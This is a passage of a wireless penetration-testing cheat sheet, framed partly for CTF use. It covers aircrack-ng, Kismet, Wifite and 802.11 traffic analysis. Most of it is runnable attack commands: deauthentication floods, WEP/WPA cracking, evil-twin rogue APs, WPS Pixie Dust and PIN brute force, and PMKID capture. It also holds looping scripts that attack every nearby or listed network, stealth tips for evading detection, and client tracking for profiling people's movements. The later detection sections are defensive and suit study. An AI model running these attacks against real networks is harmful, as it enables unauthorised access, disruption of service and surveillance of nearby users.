### Comprehensive Frame Type Filtering

**Wireshark Display Filters:**

```
# All management frames
wlan.fc.type == 0

# All control frames
wlan.fc.type == 1

# All data frames
wlan.fc.type == 2

# Specific management subtypes
wlan.fc.type_subtype == 0x08  # Beacon
wlan.fc.type_subtype == 0x04  # Probe Request
wlan.fc.type_subtype == 0x05  # Probe Response
wlan.fc.type_subtype == 0x0b  # Authentication
wlan.fc.type_subtype == 0x00  # Association Request
wlan.fc.type_subtype == 0x01  # Association Response
wlan.fc.type_subtype == 0x0c  # Deauthentication
wlan.fc.type_subtype == 0x0a  # Disassociation

# Frame control field flags
wlan.fc.tods        # To Distribution System
wlan.fc.fromds      # From Distribution System
wlan.fc.retry       # Retransmission
wlan.fc.pwrmgt      # Power Management
wlan.fc.moredata    # More Data
wlan.fc.protected   # Protected Frame
```

**Address Field Interpretation:**

```bash
# Address 1: Always receiver address
# Address 2: Always transmitter address
# Address 3: Filtering address (BSSID in infrastructure mode)
# Address 4: Only present in WDS (mesh) networks

# To DS=0, From DS=0 (Ad-hoc/IBSS)
# Address 1: Destination, Address 2: Source, Address 3: BSSID

# To DS=1, From DS=0 (Station to AP)
# Address 1: BSSID, Address 2: Source, Address 3: Destination

# To DS=0, From DS=1 (AP to Station)
# Address 1: Destination, Address 2: BSSID, Address 3: Source

# Extract based on DS bits
tshark -r capture.cap -Y "wlan.fc.type == 2" \
  -T fields -e wlan.fc.tods -e wlan.fc.fromds \
  -e wlan.addr1 -e wlan.addr2 -e wlan.addr3
```

---

## Aircrack-ng Suite

### Interface Preparation and Monitor Mode

**Checking Wireless Interfaces:**

```bash
# List wireless interfaces
iwconfig

# Check interface details
iw dev

# Verify driver and chipset support
lspci | grep -i network
lsusb | grep -i wireless

# Check for monitor mode support
iw list | grep -A 10 "Supported interface modes"
```

**Enabling Monitor Mode:**

```bash
# Kill interfering processes
airmon-ng check kill

# Enable monitor mode (creates wlan0mon)
airmon-ng start wlan0

# Verify monitor mode
iwconfig wlan0mon

# Manual method using iw
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up

# Set specific channel
iwconfig wlan0mon channel 6
# or
iw dev wlan0mon set channel 6
```

**Disabling Monitor Mode:**

```bash
# Stop monitor mode
airmon-ng stop wlan0mon

# Restart network services
systemctl start NetworkManager
```

### Airodump-ng - Wireless Network Scanner

**Basic Network Discovery:**

```bash
# Scan all channels and bands
airodump-ng wlan0mon

# Scan specific channel
airodump-ng -c 6 wlan0mon

# Scan multiple channels
airodump-ng -c 1,6,11 wlan0mon

# Scan 5GHz band
airodump-ng --band a wlan0mon

# Scan both 2.4GHz and 5GHz
airodump-ng --band abg wlan0mon
```

**Targeted Capture:**

```bash
# Focus on specific BSSID (AP)
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon

# Capture with ESSID filter
airodump-ng -c 6 --essid "TargetNetwork" -w capture wlan0mon

# Capture only data packets (no beacons)
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture --output-format pcap wlan0mon

# Increase capture rate (hopping interval in ms)
airodump-ng --hop-interval 500 wlan0mon

# Show only APs with clients
airodump-ng --showack wlan0mon
```

**Output Formats and Options:**

```bash
# Specify output format (pcap, ivs, csv, gps, kismet, netxml)
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture \
  --output-format pcap,csv wlan0mon

# Write to specific directory
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w /tmp/captures/target wlan0mon

# Rotate file size (MB)
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture \
  --write-interval 300 wlan0mon

# Background capture
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture \
  --background 1 wlan0mon
```

**Filtering and Display:**

```bash
# Filter by encryption type
airodump-ng --encrypt WPA2 wlan0mon
airodump-ng --encrypt OPN wlan0mon  # Open networks

# Show manufacturer from OUI
airodump-ng --manufacturer wlan0mon

# Display WPS information
airodump-ng --wps wlan0mon

# Show uptime
airodump-ng --uptime wlan0mon
```

### Aireplay-ng - Packet Injection

**Deauthentication Attack:**

```bash
# Deauth specific client from AP
aireplay-ng -0 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
# -0: Deauth attack
# 10: Number of deauth packets (0 = continuous)
# -a: AP BSSID
# -c: Client MAC

# Deauth all clients from AP
aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0mon

# Continuous deauth attack
aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan0mon

# Targeted deauth with reason code
aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF \
  --ignore-negative-one wlan0mon
```

**Fake Authentication:**

```bash
# Associate with open AP
aireplay-ng -1 0 -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon
# -1: Fake authentication
# 0: Reassociation timing (0 = once)
# -a: AP BSSID
# -h: Your MAC (use -e for ESSID if needed)

# Fake auth with timing and packets
aireplay-ng -1 6000 -o 1 -q 10 -a 00:11:22:33:44:55 wlan0mon
# 6000: Reassociate every 6000 seconds
# -o 1: Send one keep-alive packet
# -q 10: Send keep-alive every 10 seconds
```

**ARP Replay Attack:**

```bash
# Capture and replay ARP packets (generate IVs for WEP)
aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon
# -3: ARP replay attack
# -b: AP BSSID
# -h: Client MAC

# With packet filtering
aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF \
  -x 1000 wlan0mon
# -x: Packets per second limit
```

**Interactive Packet Replay:**

```bash
# Replay from capture file
aireplay-ng -2 -r capture.cap wlan0mon
# -2: Interactive packet replay

# Chopchop attack (WEP key recovery)
aireplay-ng -4 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon
# -4: Chopchop attack

# Fragmentation attack
aireplay-ng -5 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon
# -5: Fragmentation attack
```

**Injection Test:**

```bash
# Test injection capability
aireplay-ng -9 wlan0mon

# Test injection to specific AP
aireplay-ng -9 -a 00:11:22:33:44:55 wlan0mon

# Test with essid
aireplay-ng -9 -e "TargetNetwork" wlan0mon
```

### Aircrack-ng - Password Cracking

**WEP Cracking:**

```bash
# Crack WEP with captured IVs
aircrack-ng capture-01.cap

# Specify BSSID
aircrack-ng -b 00:11:22:33:44:55 capture-01.cap

# PTW attack (faster, requires ARP packets)
aircrack-ng -z capture-01.cap

# Specify key length
aircrack-ng -n 64 capture-01.cap   # 64-bit WEP
aircrack-ng -n 128 capture-01.cap  # 128-bit WEP
```

**WPA/WPA2 PSK Cracking:**

```bash
# Crack with wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Specify BSSID and ESSID
aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 -e "TargetNetwork" capture-01.cap

# Use multiple capture files
aircrack-ng -w wordlist.txt capture-*.cap

# Specify ESSID when multiple networks in capture
aircrack-ng -w wordlist.txt -e "TargetNetwork" capture-01.cap
```

**Performance Optimization:**

```bash
# Use all CPU cores
aircrack-ng -w wordlist.txt capture-01.cap

# Show key in ASCII
aircrack-ng -w wordlist.txt -l output.txt capture-01.cap
# -l: Write key to file

# Combine with mask attack using pipe
crunch 8 8 -t password@@@ | aircrack-ng -w - -b 00:11:22:33:44:55 capture-01.cap
```

### Airbase-ng - Rogue AP Creation

**Creating Fake Access Point:**

```bash
# Create open rogue AP
airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# Create WEP-encrypted rogue AP
airbase-ng -e "FakeAP" -c 6 -W 1 wlan0mon
# -W 1: Enable WEP

# Create multiple fake APs from file
airbase-ng -e "RogueAP" -c 6 -W 1 -N -F essid_list.txt wlan0mon
# -N: Create APs from file
# -F: ESSID list file
```

**Evil Twin Attack:**

```bash
# Clone target AP
airbase-ng -a 00:11:22:33:44:55 -e "TargetNetwork" -c 6 wlan0mon
# -a: Set BSSID to match target

# Respond to all probe requests
airbase-ng -P -C 30 wlan0mon
# -P: Respond to all probes
# -C 30: Check for clients every 30 seconds
```

### Airdecap-ng - Decrypt Captured Traffic

**Decrypting WEP:**

```bash
# Decrypt with WEP key
airdecap-ng -w 1234567890 capture-01.cap

# Specify BSSID
airdecap-ng -b 00:11:22:33:44:55 -w 1234567890 capture-01.cap
```

**Decrypting WPA/WPA2:**

```bash
# Decrypt with PSK passphrase
airdecap-ng -e "TargetNetwork" -p passphrase capture-01.cap

# Decrypt with PMK (Pairwise Master Key)
airdecap-ng -e "TargetNetwork" -k PMK_hex_value capture-01.cap
```

### Airolib-ng - Pre-computed PMK Management

**Creating PMK Database:**

```bash
# Create database
airolib-ng pmk_db --init

# Import ESSID list
airolib-ng pmk_db --import essid essid_list.txt

# Import password list
airolib-ng pmk_db --import passwd /usr/share/wordlists/rockyou.txt

# Generate PMKs
airolib-ng pmk_db --batch

# Verify database
airolib-ng pmk_db --stats

# Use with aircrack-ng
aircrack-ng -r pmk_db capture-01.cap
```

### Besside-ng - Automated WPA Cracking

```bash
# Automatic attack on all nearby networks
besside-ng -W wlan0mon

# Target specific channel
besside-ng -c 6 wlan0mon

# Specify output location
besside-ng -o /tmp/captures wlan0mon
```

### Easside-ng - Automated WEP Cracking

```bash
# Automatic WEP cracking
easside-ng wlan0mon

# Specify output file
easside-ng -f captured.pcap wlan0mon
```

---

## Kismet Wireless Detection

### Installation and Configuration

**Installing Kismet:**

```bash
# Install on Kali
apt update && apt install kismet

# Install from source for latest version
wget https://www.kismetwireless.net/code/kismet-latest.tar.xz
tar -xf kismet-latest.tar.xz
cd kismet-*
./configure
make
sudo make suidinstall
```

**Initial Configuration:**

```bash
# Configure as non-root user
sudo usermod -aG kismet $USER

# Edit configuration
sudo nano /etc/kismet/kismet.conf

# Key configuration options:
# source=wlan0:name=wireless
# channel_hop=true
# channel_hop_speed=5/sec
```

### Starting Kismet

**Console Mode:**

```bash
# Start with specific interface
kismet -c wlan0

# Start with monitor mode interface
kismet -c wlan0mon

# Start with multiple interfaces
kismet -c wlan0,wlan1

# Specify capture source name
kismet -c wlan0:name=internal

# Start without channel hopping (fixed channel)
kismet -c wlan0:hop=false,channel=6
```

**Server Mode:**

```bash
# Start server only (no UI)
kismet_server -c wlan0

# Specify configuration file
kismet_server --config-file=/custom/path/kismet.conf

# Set working directory
kismet_server -c wlan0 --log-prefix=/var/log/kismet/
```

**Web Interface:**

```bash
# Start Kismet (web interface on http://localhost:2501)
kismet

# Access from remote machine
kismet --bind-address=0.0.0.0

# Set custom port
kismet --tcp-port=8080

# Default credentials: kismet / kismet (change on first login)
```

### Kismet Capture Configuration

**Source Configuration:**

```bash
# Multiple sources with different configurations
kismet -c wlan0:name=card1,hop=true \
       -c wlan1:name=card2,channel=6,hop=false

# UUID for source identification
kismet -c wlan0:uuid=SOURCE-UUID-HERE

# Add source remotely
kismet_client --add-source=wlan0mon

# Channel hopping configuration
kismet -c wlan0:channels="1,2,3,4,5,6,7,8,9,10,11"

# 5GHz channels
kismet -c wlan0:channels="36,40,44,48,149,153,157,161,165"

# Both bands
kismet -c wlan0:channels="1,6,11,36,149"
```

**Logging Configuration:**

```bash
# Specify log types
kismet -c wlan0 --log-types=kismet,pcapng,wiglecsv

# Disable logging
kismet -c wlan0 --no-logging

# Log to specific directory
kismet -c wlan0 --log-prefix=/captures/

# Set log title
kismet -c wlan0 --log-title=office_survey_2025
```

### Kismet Data Analysis

**Kismetdb Tools:**

```bash
# Extract to PCAP
kismetdb_to_pcap --in Kismet-20250101-00-00-00-1.kismet \
                 --out output.pcapng

# Extract specific devices
kismetdb_to_pcap --in capture.kismet \
                 --out filtered.pcapng \
                 --device 00:11:22:33:44:55

# Extract WPA handshakes
kismetdb_to_pcap --in capture.kismet \
                 --out handshakes.pcapng \
                 --handshakes-only

# Convert to Wigle CSV
kismetdb_to_wiglecsv --in capture.kismet \
                     --out wigle_export.csv

# Statistics
kismetdb_statistics --in capture.kismet
```

**Kismet Log Tools:**

```bash
# Dump device list
kismetdb_dump_devices --in capture.kismet

# Extract specific device details (JSON)
kismetdb_dump_devices --in capture.kismet \
                      --device 00:11:22:33:44:55

# Export all alerts
kismetdb_dump_alerts --in capture.kismet

# Extract GPS data
kismetdb_dump_gps --in capture.kismet --out gps.kml
```

### Filtering and Detection

**Display Filters in Web UI:**

```
# Filter by SSID
ssid="TargetNetwork"

# Filter by BSSID
bssid=00:11:22:33:44:55

# Filter by encryption
encryption=WPA2

# Filter open networks
encryption=None

# Filter by channel
channel=6

# Filter by signal strength (dBm)
signal>-50

# Filter by device type
devicetype=Wi-Fi AP
devicetype=Wi-Fi Client

# Filter WPS enabled
wps=1

# Filter by manufacturer
manufacturer=Apple

# Combine filters
ssid="Target" and channel=6 and encryption=WPA2
```

### Kismet REST API

**API Access:**

```bash
# Set API key
KISMET_API="YOUR-API-KEY-HERE"

# Get system status
curl http://localhost:2501/system/status.json \
  --cookie "KISMET=${KISMET_API}"

# Get device list
curl http://localhost:2501/devices/summary/devices.json \
  --cookie "KISMET=${KISMET_API}"

# Get specific device
curl http://localhost:2501/devices/by-key/DEVICE-KEY/device.json \
  --cookie "KISMET=${KISMET_API}"

# Get alerts
curl http://localhost:2501/alerts/all_alerts.json \
  --cookie "KISMET=${KISMET_API}"

# Export packets
curl http://localhost:2501/pcap/all_packets.pcapng \
  --cookie "KISMET=${KISMET_API}" \
  -o export.pcapng
```

### Detection Capabilities

**Rogue AP Detection:**

```bash
# Kismet automatically detects:
# - Same SSID on different BSSIDs
# - MAC address spoofing attempts
# - Unusual beacon intervals
# - Mismatched information elements

# View alerts in logs
grep "APSPOOF" ~/.kismet/logs/*.kismet

# Configure custom alerts in kismet_alerts.conf
```

**Client Tracking:**

```bash
# Track probing clients
# Web UI: Devices → Filter by devicetype=Wi-Fi Client

# Export client probe list
kismetdb_dump_devices --in capture.kismet | \
  jq '.[] | select(.devicetype=="Wi-Fi Client") | .probed_ssids'
```

**Hidden SSID Detection:**

```bash
# Kismet reveals hidden SSIDs through:
# - Probe requests
# - Association frames
# - Reassociation frames

# Check for cloaked networks
# Web UI: Filter by ssid=""
```

### Advanced Kismet Features

**GPS Integration:**

```bash
# Use with GPSD
kismet -c wlan0 --override gps=true

# Verify GPS
gpsmon

# Export wardriving data
kismetdb_to_wiglecsv --in capture.kismet --out wigle.csv
# Upload to wigle.net
```

**Packet Capture Optimization:**

```bash
# Capture only specific frame types
kismet -c wlan0:filter_mgmt=true,filter_data=false

# Reduce capture size (management frames only)
kismet -c wlan0:fcsfail=false,validate_fcs=true
```

**Remote Capture:**

```bash
# On remote sensor
kismet_cap_linux_wifi --source=wlan0 --connect=SERVER_IP:3501

# On server
kismet_server --bind-address=0.0.0.0
```

---

## Wifite Automation

### Installation

```bash
# Install on Kali
apt update && apt install wifite

# Install from GitHub (latest version)
git clone https://github.com/derv82/wifite2.git
cd wifite2
sudo python3 setup.py install
```

### Basic Usage

**Automatic Attack Mode:**

```bash
# Start with defaults (WPA attacks on all nearby APs)
wifite

# Attack WEP networks only
wifite --wep

# Attack WPA networks only
wifite --wpa

# Attack WPS networks only
wifite --wps

# Attack all encryption types
wifite --wep --wpa --wps
```

**Interface Selection:**

```bash
# Specify wireless interface
wifite -i wlan0

# Wifite automatically enables monitor mode
# To use existing monitor interface
wifite -i wlan0mon
```

### Target Selection and Filtering

**Automatic Scanning:**

```bash
# Scan for 30 seconds then show menu
wifite --scan-time 30

# Scan specific channel
wifite --channel 6

# Scan multiple channels
wifite --channel 1,6,11

# Scan 5GHz channels
wifite --5ghz

# Show only targets with clients
wifite --clients-only

# Minimum signal strength filter (dBm)
wifite --min-power -50
````

**Manual Target Selection:**

```bash
# Target specific BSSID
wifite --bssid 00:11:22:33:44:55

# Target specific ESSID
wifite --essid "TargetNetwork"

# Target multiple networks
wifite --essid "Network1,Network2,Network3"

# Show all targets including duplicates
wifite --show-all
````

### WPA/WPA2 Attack Configuration

**Dictionary Attack:**

```bash
# Specify wordlist
wifite --dict /usr/share/wordlists/rockyou.txt

# Use multiple wordlists
wifite --dict wordlist1.txt,wordlist2.txt

# Skip handshake capture (use existing)
wifite --no-deauth

# Custom deauth count
wifite --deauth-count 10

# Deauth timeout
wifite --deauth-timeout 30
```

**PMKID Attack:**

```bash
# Enable PMKID attack
wifite --pmkid

# PMKID timeout
wifite --pmkid-timeout 120

# Use only PMKID (skip handshake)
wifite --pmkid --skip-crack
```

**Handshake Capture:**

```bash
# Capture handshake only (no cracking)
wifite --skip-crack

# Verify handshake with multiple tools
wifite --check-handshake all

# Ignore old handshakes
wifite --ignore-old-handshakes

# Keep handshake files
wifite --keep-ivs
```

### WPS Attack Configuration

**Pixie Dust Attack:**

```bash
# Enable Pixie Dust
wifite --wps-only --pixie

# Pixie Dust timeout
wifite --pixie-timeout 300

# Skip Pixie Dust
wifite --no-pixie
```

**PIN Brute Force:**

```bash
# Enable WPS PIN attack
wifite --wps-only --pin

# Disable PIN attack
wifite --no-pin

# WPS PIN timeout
wifite --wps-timeout 660

# Number of WPS failures before moving to next target
wifite --wps-fails 10
```

**Reaver Configuration:**

```bash
# Use Reaver for WPS
wifite --reaver

# Reaver timeout per PIN attempt
wifite --reaver-timeout 10

# Reaver delay between attempts
wifite --reaver-delay 1
```

**Bully Configuration:**

```bash
# Use Bully instead of Reaver
wifite --bully

# Bully timeout
wifite --bully-timeout 10
```

### WEP Attack Configuration

```bash
# Attack WEP only
wifite --wep

# Minimum IVs required
wifite --wep-ivs 10000

# WEP timeout
wifite --wep-timeout 600

# Restart WEP session after timeout
wifite --wep-restart 600

# Keep WEP capture files
wifite --keep-ivs

# Use ARP replay
wifite --arpreplay

# Use fragment attack
wifite --fragment

# Use chopchop attack
wifite --chopchop

# Use p0841 attack
wifite --p0841
```

### Advanced Options

**Anonymization:**

```bash
# Change MAC address
wifite --mac

# Random MAC
wifite --random-mac

# Specific MAC address
wifite --mac-address AA:BB:CC:DD:EE:FF
```

**Performance Tuning:**

```bash
# Kill interfering processes
wifite --kill

# Don't kill processes
wifite --no-kill

# Hop channels faster
wifite --hop-interval 100

# Number of deauths to send
wifite --num-deauths 5
```

**Output Configuration:**

```bash
# Custom cracked file location
wifite --cracked /tmp/cracked.txt

# Verbose output
wifite -v

# Very verbose (debug)
wifite -vv

# JSON output
wifite --json output.json
```

### Attack Combinations and Workflows

**Comprehensive Automated Attack:**

```bash
# Full spectrum attack with optimal settings
wifite --wpa --wps --wep \
  --dict /usr/share/wordlists/rockyou.txt \
  --pmkid \
  --pixie \
  --clients-only \
  --min-power -70 \
  --channel 1,6,11 \
  --mac \
  --kill
```

**Targeted WPA Attack:**

```bash
# Focus on specific network with multiple attack vectors
wifite --bssid 00:11:22:33:44:55 \
  --dict /usr/share/wordlists/rockyou.txt \
  --pmkid \
  --pmkid-timeout 180 \
  --deauth-count 10 \
  --check-handshake all \
  -vv
```

**Fast WPS Reconnaissance:**

```bash
# Quick WPS vulnerability check
wifite --wps-only \
  --pixie \
  --pixie-timeout 120 \
  --no-pin \
  --scan-time 20
```

**Passive Monitoring:**

```bash
# Capture handshakes without active attacks
wifite --no-deauth \
  --skip-crack \
  --scan-time 300
```

### CTF-Specific Wifite Usage

**Challenge Pattern Recognition:**

1. **Pre-captured handshake provided:** Use aircrack-ng directly
2. **Live network simulation:** Wifite automated attack
3. **WPS vulnerability:** Pixie Dust priority
4. **Weak WEP:** Automated IV collection

**Example CTF Workflow:**

```bash
# Scenario 1: Unknown network type
wifite --wpa --wps --wep --scan-time 30 -vv

# Scenario 2: Provided wordlist challenge
wifite --essid "CTF_Network" \
  --dict provided_wordlist.txt \
  --pmkid \
  --skip-crack

# Then crack offline with hashcat
hcxpcapngtool -o hash.hc22000 hs/*.cap
hashcat -m 22000 hash.hc22000 provided_wordlist.txt

# Scenario 3: WPS PIN known
# Extract PIN from challenge description, then use Reaver directly
reaver -i wlan0mon -b 00:11:22:33:44:55 -p 12345670 -vv
```

### Post-Attack Analysis

**Examining Wifite Results:**

```bash
# Default output location
ls -lah hs/  # Handshakes
ls -lah /root/.wifite/  # Cracked passwords

# View cracked passwords
cat /root/.wifite/cracked.txt

# Examine captured handshakes
ls -lah hs/*.cap

# Verify handshakes manually
aircrack-ng hs/handshake_TargetNetwork_*.cap
```

**Converting Captures for Analysis:**

```bash
# Convert for hashcat
cap2hccapx hs/handshake*.cap output.hccapx

# Or use hcxpcapngtool (newer method)
hcxpcapngtool -o hash.hc22000 hs/*.cap

# Extract PMKID separately
hcxpcapngtool --pmkid=pmkid.txt hs/*.cap
```

### Troubleshooting Wifite

**Common Issues:**

```bash
# No networks found
# Check monitor mode
iwconfig

# Verify channel hopping
iw dev wlan0mon info

# Test injection
aireplay-ng -9 wlan0mon

# Interface issues
# Restart network services
systemctl restart NetworkManager

# Reset interface
ip link set wlan0 down
ip link set wlan0 up
airmon-ng check kill
airmon-ng start wlan0

# Deauth not working
# Check if AP has 802.11w (Management Frame Protection)
wifite --pmkid-only --essid "TargetNetwork"

# Slow performance
# Use single channel
wifite --channel 6 --essid "TargetNetwork"

# Missing dependencies
wifite --check-dependencies
```

**Debug Mode:**

```bash
# Maximum verbosity
wifite -vv --essid "TargetNetwork"

# Check Wifite configuration
wifite --help

# Test tools individually
which aircrack-ng reaver bully
```

### Integration with Other Tools

**Wifite + Hashcat:**

```bash
# Capture with Wifite
wifite --skip-crack --essid "Target" -o /tmp/captures

# Convert to hashcat format
hcxpcapngtool -o target.hc22000 /tmp/captures/hs/*.cap

# Crack with hashcat (WPA/WPA2)
hashcat -m 22000 target.hc22000 wordlist.txt

# Crack PMKID
hashcat -m 22000 target.hc22000 wordlist.txt --force

# Rule-based attack
hashcat -m 22000 target.hc22000 wordlist.txt -r rules/best64.rule

# Mask attack (8 digits)
hashcat -m 22000 target.hc22000 -a 3 ?d?d?d?d?d?d?d?d
```

**Wifite + John the Ripper:**

```bash
# Convert capture to John format
aircrack-ng -J john_format hs/handshake*.cap

# Crack with John
john --wordlist=wordlist.txt john_format.hccap

# Show cracked passwords
john --show john_format.hccap
```

**Wifite + Cowpatty:**

```bash
# Generate rainbow table
genpmk -f wordlist.txt -d rainbow.db -s "ESSID"

# Crack with rainbow table
cowpatty -r hs/handshake*.cap -d rainbow.db -s "ESSID"
```

### Scripting and Automation

**Automated Wifite Scanning:**

```bash
#!/bin/bash
# Continuous scanning script

while true; do
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    # Run Wifite scan
    wifite --wpa --wps \
           --dict /usr/share/wordlists/rockyou.txt \
           --pmkid \
           --scan-time 300 \
           --cracked /logs/cracked_${timestamp}.txt \
           --skip-crack
    
    # Wait before next scan
    sleep 600
done
```

**Targeted Attack Script:**

```bash
#!/bin/bash
# Target specific networks from file

target_file="targets.txt"

while IFS= read -r bssid; do
    echo "[*] Attacking $bssid"
    
    wifite --bssid "$bssid" \
           --wpa --wps \
           --dict wordlist.txt \
           --pmkid \
           --pixie \
           --deauth-count 20 \
           -vv
    
    # Check if cracked
    if grep -q "$bssid" /root/.wifite/cracked.txt; then
        echo "[+] Successfully cracked $bssid"
    else
        echo "[-] Failed to crack $bssid"
    fi
    
done < "$target_file"
```

**Result Parsing:**

```bash
#!/bin/bash
# Parse Wifite results

cracked_file="/root/.wifite/cracked.txt"

if [ -f "$cracked_file" ]; then
    echo "=== Cracked Networks ==="
    cat "$cracked_file" | while IFS= read -r line; do
        essid=$(echo "$line" | awk '{print $1}')
        password=$(echo "$line" | awk '{print $NF}')
        echo "Network: $essid | Password: $password"
    done
else
    echo "No cracked networks found"
fi
```

### Best Practices for CTF Scenarios

**Pre-Attack Reconnaissance:**

```bash
# Survey environment first
airodump-ng wlan0mon --band abg --write survey

# Identify targets with clients
# Prioritize: WPS enabled > WPA2-PSK > WEP > Open

# Check for:
# - Hidden SSIDs (probe requests reveal)
# - Client activity (higher success rate)
# - Signal strength (closer = better)
# - WPS enabled (quick win)
```

**Attack Priority:**

```
1. WPS Pixie Dust (seconds to minutes)
2. PMKID attack (passive, no deauth needed)
3. WPA handshake capture + dictionary
4. WEP cracking (if present)
5. WPA handshake + rule-based cracking
6. WPA handshake + mask attack
```

**Optimization Tips:**

```bash
# Single channel reduces packet loss
wifite --channel 6 --essid "Target"

# MAC randomization for stealth
wifite --random-mac

# Conservative deauth prevents detection
wifite --deauth-count 5

# Parallel attacks (multiple interfaces)
wifite -i wlan0 --essid "Network1" &
wifite -i wlan1 --essid "Network2" &

# Offline cracking is faster
wifite --skip-crack  # Capture only
# Then crack on powerful machine
```

### Monitoring Wifite Activity

**Real-time Monitoring:**

```bash
# Terminal 1: Run Wifite
wifite --wpa -vv

# Terminal 2: Monitor captures
watch -n 1 'ls -lh hs/'

# Terminal 3: Monitor system
htop

# Terminal 4: Monitor wireless
watch -n 1 'iwconfig wlan0mon'
```

**Log Analysis:**

```bash
# Wifite logs location
find /root/.wifite/ -type f

# Recent activity
tail -f /root/.wifite/wifite.log

# Success rate
grep "cracked" /root/.wifite/wifite.log | wc -l

# Failed attempts
grep "failed" /root/.wifite/wifite.log
```

---

## Wireless Traffic Analysis - Advanced Techniques

### 802.11 Protocol Analysis

**Frame Timing Analysis:**

```bash
# Beacon interval analysis (normal = 102.4ms)
tshark -r capture.cap -Y "wlan.fc.type_subtype == 0x08" \
  -T fields -e frame.time_relative -e wlan.bssid | \
  awk '{if(prev_mac==$2) print $1-prev_time; prev_time=$1; prev_mac=$2}'

# Abnormal intervals may indicate rogue AP or attack
```

**Retry Rate Analysis:**

```bash
# High retry rate indicates interference or jamming
tshark -r capture.cap -Y "wlan.fc.retry == 1" | wc -l

# Per-device retry analysis
tshark -r capture.cap -Y "wlan.fc.retry == 1" \
  -T fields -e wlan.sa | sort | uniq -c | sort -rn
```

**Channel Utilization:**

```bash
# Calculate channel busy time
tshark -r capture.cap -T fields -e frame.len -e frame.time_relative | \
  awk '{bytes+=$1} END {print "Throughput:", bytes*8/NR, "bps"}'
```

### WPA/WPA2 Handshake Verification

**Manual Handshake Validation:**

```bash
# Extract EAPOL frames (4-way handshake)
tshark -r capture.cap -Y "eapol" -w handshake_only.cap

# Verify handshake completeness
tshark -r handshake_only.cap -Y "eapol" \
  -T fields -e frame.number -e eapol.keydes.msgnr

# Required messages: 1, 2, 3, 4 (or 1, 2, 3)

# Extract nonce values
tshark -r handshake_only.cap -Y "eapol.keydes.key_info == 0x008a" \
  -T fields -e wlan.sa -e eapol.keydes.nonce
```

**PMKID Extraction:**

```bash
# Extract PMKID from first EAPOL frame
tshark -r capture.cap -Y "eapol.keydes.key_info == 0x008a" \
  -T fields -e wlan.pmkid

# Convert to hashcat format manually
# Format: WPA*01*PMKID*MAC_AP*MAC_CLIENT*ESSID
```

### Rogue AP Detection Methods

**Statistical Anomaly Detection:**

```bash
# Beacon frame rate anomalies
tshark -r capture.cap -Y "wlan.fc.type_subtype == 0x08" \
  -T fields -e frame.time_relative -e wlan.bssid | \
  awk '{count[$2]++} END {for(mac in count) print mac, count[mac]}'

# Legitimate AP: ~10 beacons/second per channel
# Rogue AP may send beacons at abnormal rates

# Information Element (IE) inconsistencies
tshark -r capture.cap -Y "wlan.fc.type_subtype == 0x08" \
  -T fields -e wlan.bssid -e wlan.ds.current_channel \
  -e wlan.supported_rates -e wlan.rsn.pcs.type | \
  sort | uniq

# Same SSID with different capabilities = potential evil twin
```

**MAC Address Vendor Analysis:**

```bash
# Extract unique MAC vendors
tshark -r capture.cap -T fields -e wlan.bssid | \
  sort -u | while read mac; do
    echo "$mac - $(grep -i "${mac:0:8}" /usr/share/ieee-data/oui.txt)"
  done

# Inconsistent vendors for same SSID = suspicious
```

**Signal Strength Mapping:**

```bash
# Extract signal strength per BSSID
tshark -r capture.cap -Y "wlan.fc.type_subtype == 0x08" \
  -T fields -e wlan.bssid -e wlan.ssid -e radiotap.dbm_antsignal | \
  awk '{sum[$1","$2]+=$3; count[$1","$2]++} 
       END {for(key in sum) print key, sum[key]/count[key]}'

# Sudden signal strength change for same BSSID = potential evil twin
```

### Packet Injection Detection

**Identifying Injected Frames:**

```bash
# Unusual sequence number gaps
tshark -r capture.cap -Y "wlan.sa == AA:BB:CC:DD:EE:FF" \
  -T fields -e wlan.seq | \
  awk '{if(NR>1) print $1-prev; prev=$1}'

# Duplicate sequence numbers (injection artifact)
tshark -r capture.cap -Y "wlan.sa == AA:BB:CC:DD:EE:FF" \
  -T fields -e wlan.seq | sort | uniq -d

# Broadcast deauths from multiple sources
tshark -r capture.cap -Y "wlan.fc.type_subtype == 0x0c and wlan.da == ff:ff:ff:ff:ff:ff" \
  -T fields -e wlan.sa | sort | uniq -c
```

### Client Tracking and Profiling

**Device Fingerprinting:**

```bash
# Extract probe request signatures
tshark -r capture.cap -Y "wlan.fc.type_subtype == 0x04" \
  -T fields -e wlan.sa -e wlan.ssid -e wlan.supported_rates \
  -e wlan.ht.capabilities -e wlan.vht.capabilities

# Identify device OS/type by probe patterns
# iOS: Randomized MAC, specific probe timing
# Android: Consistent MAC, rapid probes
# Windows: Specific IE ordering
```

**Movement Tracking:**

```bash
# Signal strength over time (geolocation estimation)
tshark -r capture.cap -Y "wlan.sa == AA:BB:CC:DD:EE:FF" \
  -T fields -e frame.time_relative -e radiotap.dbm_antsignal \
  -e wlan.bssid | \
  awk '{print $1, $2, $3}'

# Export for visualization
# gnuplot or custom script for heatmap
```

---

## Important Related Topics

**WPA3 Analysis:** SAE handshake capture, Dragonblood vulnerabilities, transition mode detection

**802.11w Management Frame Protection:** Protected management frames analysis, deauth attack mitigation, MFPC/MFPR detection

**Captive Portal Bypass:** MAC spoofing, DNS tunneling, HTTPS interception, session hijacking

